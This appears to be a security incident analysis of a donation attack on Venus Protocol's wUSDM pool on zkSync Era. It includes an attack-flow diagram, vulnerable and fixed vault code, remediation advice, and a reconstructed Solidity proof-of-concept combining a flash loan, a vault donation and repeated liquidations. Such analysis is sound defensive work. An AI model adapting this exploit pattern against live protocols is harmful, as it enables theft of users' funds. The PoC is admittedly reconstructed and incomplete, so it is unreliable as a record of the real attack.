# Venus Protocol (zkSync) — wUSDM Donation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2025-02-28 |
| **Protocol** | Venus Protocol (zkSync Era) |
| **Chain** | zkSync Era |
| **Loss** | ~86.7 WETH |
| **Attacker** | [Unidentified](https://era.zksync.network/address/0x0000000000000000000000000000000000000000) |
| **Attack Tx** | [Unidentified](https://era.zksync.network) |
| **Vulnerable Contract** | Venus Protocol wUSDM Pool (zkSync Era) |
| **Root Cause** | Directly donating USDM to the wUSDM vault to artificially inflate share value, then repeatedly triggering over-collateralized liquidations to acquire vWETH |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-02/Venus_ZKSync_exp.sol) |

---

## 1. Vulnerability Overview

In Venus Protocol's zkSync Era deployment, the share price of the wUSDM (wrapped USDM) vault was vulnerable to a donation attack. The attacker obtained a 2,100 WETH flash loan from Aave, minted vWETH, then borrowed vUSDM. They subsequently donated USDM directly to the wUSDM vault, artificially inflating the vault's share value. Using this inflated share value, a helper contract executed 35 repeated liquidations to acquire vWETH collateral, ultimately realizing a net profit of approximately 86.7 WETH.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: vault share price can be manipulated via direct donation
contract wUSDMVault is ERC4626 {
    // ERC4626's totalAssets() returns the actual USDM balance held in the vault
    function totalAssets() public view override returns (uint256) {
        return IERC20(USDM).balanceOf(address(this));
        // ❌ Direct donation increases totalAssets → share price rises
    }

    // Assets per share = totalAssets / totalSupply
    // After donation: (original assets + donated amount) / totalSupply → share price spikes
}

// Venus calculates collateral value using wUSDM share price
// → collateral value can be inflated via donation

// ✅ Safe code: TWAP-based share price or blocking donations
contract wUSDMVault is ERC4626 {
    uint256 private _trackedAssets; // tracks only actually deposited assets

    function deposit(uint256 assets, address receiver) public override returns (uint256) {
        _trackedAssets += assets;
        return super.deposit(assets, receiver);
    }

    function totalAssets() public view override returns (uint256) {
        return _trackedAssets; // donations are not included
    }
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (Receiver Contract)
  │
  ├─→ [1] Flash loan 2,100 WETH from Aave
  │
  ├─→ [2] WETH → mint vWETH (set as collateral)
  │
  ├─→ [3] Borrow 35 vUSDM (wUSDM)
  │         └─ Transfer to Helper contract
  │
  ├─→ [4] Helper: vUSDM → mint additional vUSDM
  │
  ├─→ [5] KEY: Donate USDM directly to wUSDM vault
  │         └─ totalAssets spikes → share price inflated
  │
  ├─→ [6] Helper: Execute 35 liquidations repeatedly
  │         └─ Acquire Receiver's vWETH collateral at inflated price
  │
  ├─→ [7] Acquired vWETH → redeem for WETH
  │
  ├─→ [8] Helper: Borrow additional WETH
  │
  ├─→ [9] Repay Aave flash loan (2,100 WETH + fees)
  │
  └─→ [10] ~86.7 WETH net profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not available — reconstructed from summary

contract VenusAttackReceiver {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // [2] WETH → mint vWETH
        IVToken(vWETH).mint(2100 ether);

        // [3] Borrow 35 vUSDM
        for (uint i = 0; i < 35; i++) {
            IVToken(vUSDM).borrow(borrowAmount);
        }
        IERC20(wUSDM).transfer(helperContract, wUSDMBalance);

        // [5] KEY: Donate USDM directly to wUSDM vault (inflate share price)
        uint256 donationAmount = IERC20(USDM).balanceOf(address(this));
        IERC20(USDM).transfer(address(wUSDMVault), donationAmount);
        // wUSDM vault totalAssets spikes → USDM value per share skyrockets

        // [6] Helper contract executes 35 liquidations
        IHelper(helperContract).executeLiquidations(35);

        // [7] Retrieve vWETH from Helper and redeem for WETH
        IVToken(vWETH).redeem(vWETHReceived);

        // [9] Repay Aave
        IERC20(WETH).approve(AAVE_POOL, amounts[0] + premiums[0]);
        return true;
    }
}

contract VenusAttackHelper {
    function executeLiquidations(uint256 count) external {
        for (uint256 i = 0; i < count; i++) {
            // Execute liquidation using inflated collateral value → acquire vWETH
            IVToken(vUSDM).liquidateBorrow(receiver, borrowAmount, vWETH);
        }
        // Transfer acquired vWETH to Receiver
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | ERC4626 Donation Attack |
| **CWE** | CWE-682: Incorrect Calculation |
| **Attack Vector** | External (Flash Loan + Direct Token Donation) |
| **DApp Category** | Lending/Leverage Protocol |
| **Impact** | ~86.7 WETH stolen |

## 6. Remediation Recommendations

1. **Virtual asset defense**: In ERC4626, use an internal tracking variable so that tokens transferred directly to the vault are not reflected in the share price via `totalAssets()`
2. **TWAP-based share price**: Calculate collateral value using a time-weighted average price instead of the instantaneous share price
3. **Minimum share deposit**: Set minimum locked liquidity to prevent donation attacks on empty vaults
4. **Consecutive liquidation limit**: Restrict the number of liquidations against the same account within a single transaction

## 7. Lessons Learned

- Donation attacks on ERC4626 vaults are a known pattern that occurs when `totalAssets()` includes directly transferred tokens.
- When a lending protocol uses an external vault's share price for collateral calculations, it must thoroughly assess how susceptible that vault is to price manipulation.
- When deploying an existing protocol to a new chain (zkSync Era), the same security audits must be performed again. New attack vectors can emerge depending on the characteristics of the chain.